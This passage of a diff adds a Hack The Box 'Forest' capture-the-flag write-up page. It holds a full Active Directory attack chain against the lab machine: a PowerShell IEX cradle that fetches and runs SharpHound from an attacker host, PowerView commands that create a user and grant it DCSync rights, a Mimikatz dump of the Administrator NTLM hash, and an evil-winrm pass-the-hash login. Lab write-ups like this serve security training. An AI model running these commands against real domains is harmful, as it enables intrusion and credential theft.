+</span><span class="nf">HTB\Privileged</span><span class="w"> </span><span class="nx">IT</span><span class="w"> </span><span class="nx">Accounts</span><span class="w">   </span><span class="nx">Group</span><span class="w">  </span><span class="nx">S-1-5-21-3072663084-364016917-1341370565-1149</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="nf">HTB\Service</span><span class="w"> </span><span class="nx">Accounts</span><span class="w">         </span><span class="nx">Group</span><span class="w">  </span><span class="nx">S-1-5-21-3072663084-364016917-1341370565-1148</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span></code></pre></figure>
+
+<p>To find a path to own the <code class="highlighter-rouge">Domain Administrator</code> we will use <a href="https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/">Bloodhound</a>.</p>
+
+<p>We grab the data we need by using <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1">Sharphound</a>:</p>
+
+<figure class="highlight"><pre><code class="language-posh" data-lang="posh"><span class="nf">PS</span><span class="w"> </span><span class="nx">htb\svc-alfresco</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-command</span><span class="w"> </span><span class="s2">"IEX (New-Object System.Net.Webclient).DownloadString('http://&lt;attacker-ip&gt;/SharpHound.ps1');Invoke-BloodHound -CollectionMethod All -SearForest -Domain HTB.LOCAL -DomainController FOREST.HTB.LOCAL -LDAPUser svc-alfresco -LDAPPass s3....ce -ZipFileName bloodhound.zip -Verbose"</span><span class="w">
+</span><span class="nf">Initializing</span><span class="w"> </span><span class="nx">BloodHound</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">7:49</span><span class="w"> </span><span class="nx">AM</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">3/21/2020</span><span class="w">
+</span><span class="nf">Manually</span><span class="w"> </span><span class="nx">specifying</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">controller</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">likely</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="nx">loss.</span><span class="w"> </span><span class="nx">Only</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">performance/opsec</span><span class="w"> </span><span class="nx">reasons</span><span class="w">
+</span><span class="nf">Adding</span><span class="w"> </span><span class="nx">Network</span><span class="w"> </span><span class="nx">Credential</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">connection</span><span class="w">
+</span><span class="nf">Resolved</span><span class="w"> </span><span class="nx">Collection</span><span class="w"> </span><span class="nx">Methods</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">Group</span><span class="p">,</span><span class="w"> </span><span class="nx">LocalAdmin</span><span class="p">,</span><span class="w"> </span><span class="nx">Session</span><span class="p">,</span><span class="w"> </span><span class="nx">LoggedOn</span><span class="p">,</span><span class="w"> </span><span class="nx">Trusts</span><span class="p">,</span><span class="w"> </span><span class="nx">ACL</span><span class="p">,</span><span class="w"> </span><span class="nx">Container</span><span class="p">,</span><span class="w"> </span><span class="nx">RDP</span><span class="p">,</span><span class="w"> </span><span class="nx">ObjectProps</span><span class="p">,</span><span class="w"> </span><span class="nx">DCOM</span><span class="p">,</span><span class="w"> </span><span class="nx">SPNTargets</span><span class="w">
+</span><span class="nf">Building</span><span class="w"> </span><span class="nx">GUID</span><span class="w"> </span><span class="nx">Cache</span><span class="w">
+</span><span class="nf">Starting</span><span class="w"> </span><span class="nx">Enumeration</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">HTB.LOCAL</span><span class="w">
+</span><span class="nf">Adding</span><span class="w"> </span><span class="nx">Network</span><span class="w"> </span><span class="nx">Credential</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">connection</span><span class="w">
+</span><span class="nf">Waiting</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">enumeration</span><span class="w"> </span><span class="nx">threads</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">finish</span><span class="w">
+</span><span class="nf">Found</span><span class="w"> </span><span class="nx">usable</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Controller</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">htb.local</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">FOREST.htb.local</span><span class="w">
+</span><span class="nf">EXCH01.HTB.LOCAL</span><span class="w"> </span><span class="nx">did</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">respond</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">ping</span><span class="w">
+</span><span class="nf">Status:</span><span class="w"> </span><span class="nx">123</span><span class="w"> </span><span class="nx">objects</span><span class="w"> </span><span class="nx">enumerated</span><span class="w"> </span><span class="p">(</span><span class="o">+</span><span class="mi">123</span><span class="w"> </span><span class="mf">61.5</span><span class="nf">/s</span><span class="w"> </span><span class="nf">---</span><span class="w"> </span><span class="nx">Using</span><span class="w"> </span><span class="nx">148</span><span class="w"> </span><span class="nx">MB</span><span class="w"> </span><span class="nx">RAM</span><span class="w"> </span><span class="p">)</span><span class="w">
+</span><span class="nf">Finished</span><span class="w"> </span><span class="nx">enumeration</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">HTB.LOCAL</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">00:00:02.6399943</span><span class="w">
+</span><span class="mi">1</span><span class="w"> </span><span class="nf">hosts</span><span class="w"> </span><span class="nx">failed</span><span class="w"> </span><span class="nx">ping.</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">hosts</span><span class="w"> </span><span class="nx">timedout.</span><span class="w">
+</span><span class="nf">Waiting</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">writer</span><span class="w"> </span><span class="nx">thread</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">finish</span><span class="w">
+
+</span><span class="nf">Compressing</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Documents\bloodhound.zip.</span><span class="w">
+</span><span class="nf">You</span><span class="w"> </span><span class="nx">can</span><span class="w"> </span><span class="nx">upload</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">directly</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">UI.</span><span class="w">
+</span><span class="nf">Finished</span><span class="w"> </span><span class="nx">compressing</span><span class="w"> </span><span class="nx">files</span><span class="o">!</span></code></pre></figure>
+
+<p>We can then download <code class="highlighter-rouge">bloodhound.zip</code> and load it into <em>Bloodhound</em> by going over to the right side and selecting <code class="highlighter-rouge">Upload Data</code> from the vertical menu.</p>
+
+<p>On the left side we see <code class="highlighter-rouge">Database Info</code> and to the right of that we click on <code class="highlighter-rouge">Queries</code>, then select <code class="highlighter-rouge">Find Shortest Paths to Domain Admins</code>.</p>
+
+<p>This gives us a nice overview of the path we need to take:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/forest/forest.htb_bloodhound.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/forest/forest.htb_bloodhound.png" alt="Forest Bloodhound Screenshot" class="img-fluid" /></a></p>
+
+<p>As we expected we move through the groups we saw earlier until we see that we are also in the <code class="highlighter-rouge">Account Operators</code> group with <code class="highlighter-rouge">GenericAll</code> permissions. We also see the <code class="highlighter-rouge">Exchange Windows Permissions</code> group which would give <code class="highlighter-rouge">WriteDacl</code> privileges.</p>
+
+<p>If we hover over <code class="highlighter-rouge">GenericAll</code> we can right click and select <code class="highlighter-rouge">Help</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/forest/forest.htb_bloodhound-genericall.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/forest/forest.htb_bloodhound-genericall.png" alt="Forest Bloodhound WriteDacl Screenshot" class="img-fluid" /></a></p>
+
+<p>From here we get literal instructions to add ourselves to the <code class="highlighter-rouge">Domain Admins</code> group with <em>PowerView</em> which seems a little too hopeful. Downloading <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView</a> to the victim machine and trying this results in <code class="highlighter-rouge">Permission Denied</code>.</p>
+
+<p>Using the <code class="highlighter-rouge">Exchange Windows Permissions</code> group instead we get some success:</p>
+
+<figure class="highlight"><pre><code class="language-posh" data-lang="posh"><span class="nf">PS</span><span class="w"> </span><span class="nx">htb\svc-alfresco</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Add-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Exchange Windows Permissions'</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s1">'svc-alfresco'</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span><span class="nf">Verbose:</span><span class="w"> </span><span class="p">[</span><span class="kt">Add</span><span class="nt">-DomainGroupMember</span><span class="p">]</span><span class="w"> </span><span class="nx">Adding</span><span class="w"> </span><span class="nx">member</span><span class="w"> </span><span class="s1">'svc-alfresco'</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s1">'Exchange Windows Permissions'</span></code></pre></figure>
+
+<p>We see that we have been added to the group when we check with <code class="highlighter-rouge">net user svc-alfresco</code>. However, after some time it disappears. Meaning the account is reset to avoid spoilers.</p>
+
+<p>So we will try and create another account and add that user to the <code class="highlighter-rouge">Exchange Windows Permissions</code> group:</p>
+
+<figure class="highlight"><pre><code class="language-posh" data-lang="posh"><span class="nf">PS</span><span class="w"> </span><span class="nx">htb\svc-alfresco</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'s3....ce'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="nf">PS</span><span class="w"> </span><span class="nx">htb\svc-alfresco</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'HTB\svc-alfresco'</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w">
+</span><span class="nf">PS</span><span class="w"> </span><span class="nx">htb\svc-alfresco</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$UserPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'&lt;user-password&gt;'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="nf">PS</span><span class="w"> </span><span class="nx">htb\svc-alfresco</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">New-DomainUser</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">sabe</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$UserPassword</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">Add-DomainGroupMember</span><span class="w"> </span><span class="s1">'Exchange Windows Permissions'</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span><span class="nf">Verbose:</span><span class="w"> </span><span class="p">[</span><span class="kt">Get</span><span class="nt">-PrincipalContext</span><span class="p">]</span><span class="w"> </span><span class="nx">Using</span><span class="w"> </span><span class="nx">alternate</span><span class="w"> </span><span class="nx">credentials</span><span class="w">
+</span><span class="nf">Verbose:</span><span class="w"> </span><span class="p">[</span><span class="kt">Get</span><span class="nt">-PrincipalContext</span><span class="p">]</span><span class="w"> </span><span class="nx">Using</span><span class="w"> </span><span class="nx">alternate</span><span class="w"> </span><span class="nx">credentials</span><span class="w">
+</span><span class="nf">Verbose:</span><span class="w"> </span><span class="p">[</span><span class="kt">New</span><span class="nt">-DomainUser</span><span class="p">]</span><span class="w"> </span><span class="nx">Attempting</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="s1">'sabe'</span><span class="w">
+</span><span class="nf">Verbose:</span><span class="w"> </span><span class="p">[</span><span class="kt">New</span><span class="nt">-DomainUser</span><span class="p">]</span><span class="w"> </span><span class="nx">User</span><span class="w"> </span><span class="s1">'sabe'</span><span class="w"> </span><span class="nx">successfully</span><span class="w"> </span><span class="nx">created</span><span class="w">
+</span><span class="nf">Verbose:</span><span class="w"> </span><span class="p">[</span><span class="kt">Add</span><span class="nt">-DomainGroupMember</span><span class="p">]</span><span class="w"> </span><span class="nx">Adding</span><span class="w"> </span><span class="nx">member</span><span class="w"> </span><span class="s1">'CN=sabe,CN=Users,DC=htb,DC=local'</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s1">'Exchange Windows Permissions'</span></code></pre></figure>
+
+<p>Oh and we almost forgot! Add your new user to the <code class="highlighter-rouge">Remote Management Users</code> group:</p>
+
+<figure class="highlight"><pre><code class="language-posh" data-lang="posh"><span class="nf">PS</span><span class="w"> </span><span class="nx">htb\svc-alfresco</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Add-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Remote Management Users'</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s1">'sabe'</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span><span class="nf">Verbose:</span><span class="w"> </span><span class="p">[</span><span class="kt">Add</span><span class="nt">-DomainGroupMember</span><span class="p">]</span><span class="w"> </span><span class="nx">Adding</span><span class="w"> </span><span class="nx">member</span><span class="w"> </span><span class="s1">'sabe'</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s1">'Remote Management Users'</span></code></pre></figure>
+
+<p>Now let’s login with our new user.</p>
+
+<p>Going back to <em>Bloodhound</em> if we hover over <code class="highlighter-rouge">WriteDacl</code> we can right click and select <code class="highlighter-rouge">Help</code> once again:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/forest/forest.htb_bloodhound-writedacl.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/forest/forest.htb_bloodhound-writedacl.png" alt="Forest Bloodhound WriteDacl Screenshot" class="img-fluid" /></a></p>
+
+<p>Again we get instructions on how to give ourselves <code class="highlighter-rouge">DCSync</code> writes which will hopefully allow us to extract hashes of the <code class="highlighter-rouge">Domain Administrator</code>.</p>
+
+<p>Let’s try doing this with the user we just created:</p>
+
+<figure class="highlight"><pre><code class="language-posh" data-lang="posh"><span class="nf">PS</span><span class="w"> </span><span class="nx">htb\seth</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'&lt;user-password&gt;'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="nf">PS</span><span class="w"> </span><span class="nx">htb\seth</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'HTB\sabe'</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w">
+</span><span class="nf">PS</span><span class="w"> </span><span class="nx">htb\seth</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s2">"dc=htb,dc=local"</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">sabe</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">DCSync</span><span class="w"> </span><span class="nt">-Verbose</span></code></pre></figure>
+
+<p>Now we can use <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a> to extract the <code class="highlighter-rouge">Administrator</code> hash:</p>
+
+<figure class="highlight"><pre><code class="language-posh" data-lang="posh"><span class="nf">PS</span><span class="w"> </span><span class="nx">htb\sabe</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Documents</span><span class="w"> </span><span class="o">.</span><span class="nx">\mimikatz.exe</span><span class="w">
+
+  </span><span class="o">.</span><span class="c">#####.   mimikatz 2.2.0 (x64) #18362 Aug 14 2019 01:31:47</span><span class="w">
+ </span><span class="o">.</span><span class="c">## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span><span class="w">
+ </span><span class="c">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><span class="w">
+ </span><span class="c">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><span class="w">
+ </span><span class="s1">'## v ##'</span><span class="w">       </span><span class="nf">Vincent</span><span class="w"> </span><span class="nx">LE</span><span class="w"> </span><span class="nx">TOUX</span><span class="w">             </span><span class="p">(</span><span class="w"> </span><span class="nf">vincent.letoux</span><span class="err">@</span><span class="nx">gmail.com</span><span class="w"> </span><span class="p">)</span><span class="w">
+  </span><span class="s1">'#####'</span><span class="w">        </span><span class="err">&gt;</span><span class="w"> </span><span class="nf">http://pingcastle.com</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">http://mysmartlogon.com</span><span class="w">   </span><span class="o">***</span><span class="nx">/</span><span class="w">
+
+</span><span class="nf">mimikatz</span><span class="w"> </span><span class="c"># lsadump::dcsync /domain:htb.local /user:Administrator</span><span class="w">
+</span><span class="p">[</span><span class="kt">DC</span><span class="p">]</span><span class="w"> </span><span class="s1">'htb.local'</span><span class="w"> </span><span class="nf">will</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">domain</span><span class="w">
+</span><span class="p">[</span><span class="kt">DC</span><span class="p">]</span><span class="w"> </span><span class="s1">'FOREST.htb.local'</span><span class="w"> </span><span class="nf">will</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">DC</span><span class="w"> </span><span class="nx">server</span><span class="w">
+
+</span><span class="p">[</span><span class="kt">DC</span><span class="p">]</span><span class="w"> </span><span class="s1">'Administrator'</span><span class="w"> </span><span class="nf">will</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">account</span><span class="w">
+
+</span><span class="nf">Object</span><span class="w"> </span><span class="nx">RDN</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">Administrator</span><span class="w">
+
+</span><span class="o">**</span><span class="w"> </span><span class="nf">SAM</span><span class="w"> </span><span class="nx">ACCOUNT</span><span class="w"> </span><span class="o">**</span><span class="w">
+
+</span><span class="nf">SAM</span><span class="w"> </span><span class="nx">Username</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">Administrator</span><span class="w">
+</span><span class="nf">User</span><span class="w"> </span><span class="nx">Principal</span><span class="w"> </span><span class="nx">Name</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="nx">Administrator</span><span class="err">@</span><span class="nx">htb.local</span><span class="w">
+</span><span class="nf">Account</span><span class="w"> </span><span class="nx">Type</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">30000000</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nf">USER_OBJECT</span><span class="w"> </span><span class="p">)</span><span class="w">
+</span><span class="nf">User</span><span class="w"> </span><span class="nx">Account</span><span class="w"> </span><span class="nx">Control</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">00000200</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nf">NORMAL_ACCOUNT</span><span class="w"> </span><span class="p">)</span><span class="w">
+</span><span class="nf">Account</span><span class="w"> </span><span class="nx">expiration</span><span class="w">   </span><span class="p">:</span><span class="w"> 
+</span><span class="nf">Password</span><span class="w"> </span><span class="nx">last</span><span class="w"> </span><span class="nx">change</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">9/18/2019</span><span class="w"> </span><span class="nx">10:09:08</span><span class="w"> </span><span class="nx">AM</span><span class="w">
+</span><span class="nf">Object</span><span class="w"> </span><span class="nx">Security</span><span class="w"> </span><span class="nx">ID</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-3072663084-364016917-1341370565-500</span><span class="w">
+</span><span class="nf">Object</span><span class="w"> </span><span class="nx">Relative</span><span class="w"> </span><span class="nx">ID</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">500</span><span class="w">
+
+</span><span class="nf">Credentials:</span><span class="w">
+  </span><span class="nf">Hash</span><span class="w"> </span><span class="nx">NTLM:</span><span class="w"> </span><span class="nx">32693b11e6....72a07ceea6</span></code></pre></figure>
+
+<p>We can now login using the NTLM Hash:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> Administrator <span class="nt">-H</span> 32693b11e6....72a07ceea6
+Evil-WinRM shell v2.0
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">cat</span> ../Desktop/root.txt
+f048153f20....04d79129cc</code></pre></figure>
+
+<p>Now that was an interesting one!</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>This box was really fun to do and fun to help people with as well. The concept was real world in the sense of misconfigurations that can help an attacker gain unauthorized access to a machine.</p>
+<!-- Hack The Box Badge -->
+          <p class="text-center" style="padding-top: 10px;"><img src="https://www.hackthebox.eu/badge/image/195745" alt="Hack The Box"></p></main>
+      </div>
+    </div>
+    <!-- Bootstrap core JavaScript -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
+    <script src="/assets/js/bootstrap.bundle.min.js"></script>
+    <!-- Custom JavaScript -->
+    <script src="/assets/js/sabe.js"></script>
+    <!-- Lightbox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js"></script>
+    <script>
+      $(document).on('click', '[data-toggle="lightbox"]', function(event) {
+        event.preventDefault();
+        $(this).ekkoLightbox();
+      });
+    </script>
+  </body>
+</html>
